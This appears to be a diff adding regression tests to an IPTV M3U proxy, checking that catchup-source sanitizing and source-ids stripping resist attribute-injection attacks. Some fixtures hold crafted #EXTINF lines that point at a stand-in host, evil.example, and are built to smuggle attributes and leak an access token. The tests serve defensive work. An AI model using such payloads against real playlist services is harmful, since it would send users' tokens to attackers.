@@ -170,6 +170,14 @@ try {
     assert.equal(sanitizeCatchup({ catchupSource: `?a=${'x'.repeat(2000)}` }).catchupSource, undefined)
   })
 
+  await check('消毒：中间夹空白（含 U+2028 / NBSP / NEL）或以 = 结尾的模板拒收，首尾空白照常去掉', () => {
+    // 写回后收尾引号紧跟其后：`…&group-title=` 拼成 `group-title="`，` source-ids=` 会被输出剥离正则吃掉
+    for (const bad of ['?a=1 b', '?a=1\u2028b', '?a=1\u00a0b', '?a=1\u0085b', '?playseek=${(b)yyyyMMddHHmmss}&group-title=', '?k=${re source-ids=']) {
+      assert.equal(sanitizeCatchup({ catchupSource: bad }).catchupSource, undefined, JSON.stringify(bad))
+    }
+    assert.equal(sanitizeCatchup({ catchupSource: ` ${PLAYSEEK} ` }).catchupSource, PLAYSEEK)
+  })
+
   await check('mergeCatchup：文件头 none、行内开启时以行内为准', () => {
     assert.deepEqual(mergeCatchup({ catchup: 'none' }, { catchup: 'append', catchupDays: 7 }), { catchup: 'append', catchupDays: 7 })
     assert.deepEqual(mergeCatchup({ catchup: 'none' }, { catchupDays: 7 }), { catchup: 'none' })
@@ -285,6 +293,37 @@ try {
       })
     }
   }
+
+  // ---- 拼属性攻击（issue #190 审查）：模板借收尾引号冒充属性、借 source-ids 剥离凑出 ${replace} ----
+  writeFileSync(join(TMP, 'interface.txt'), [
+    MIGU_HEADER,
+    // 按 updateData 写盘格式；假设旧版消毒放过了这两条，验证输出侧的剥离正则也不会被骗
+    '#EXTINF:-1 tvg-id="Evil" tvg-name="Evil" tvg-logo="" source-ids="ext:ev000001" catchup="default" catchup-source="http://evil.example/c?k=${re source-ids=" group-title="place}",Evil',
+    'http://evil.example/live.m3u8',
+    '',
+  ].join('\n'))
+  for (const profile of ['default', 'renamed']) {
+    await check(`拼属性攻击（${profile} 档）：输出剥离 source-ids 不跨属性，访问令牌不进第三方模板`, () => {
+      const out = String(interfaceStr('/m3u', { host: 'localhost:1905' }, '', '', profile, '/u/SECRET-TOKEN', '').content)
+      const evil = out.split('\n').find(l => l.endsWith(',Evil'))
+      assert.ok(!/evil\.example[^\n]*SECRET-TOKEN/.test(out), evil)
+    })
+  }
+
+  await check('拼属性攻击：订阅里的恶意模板在导入时就被拒收，分组照常', () => {
+    const channels = parsePlaylistContent([
+      '#EXTM3U',
+      '#EXTINF:-1 catchup="default" catchup-source="http://evil.example/c?k=${re source-ids=" group-title="place}",Evil',
+      'http://evil.example/live.m3u8',
+      `#EXTINF:-1 group-title="央视" catchup="append" catchup-source="?playseek=\${(b)yyyyMMddHHmmss}&group-title=",CCTV-A`,
+      'http://h/a.m3u8',
+    ].join('\n'))
+    for (const ch of channels) {
+      assert.equal('catchupSource' in ch, false, ch.name)
+      assert.equal(renderCatchupAttrs(ch).includes('catchup-source'), false, ch.name)
+    }
+    assert.equal(channels[1].group, '央视')
+  })
 
   console.log(`\n全部 ${passed} 项通过`)
 } finally {
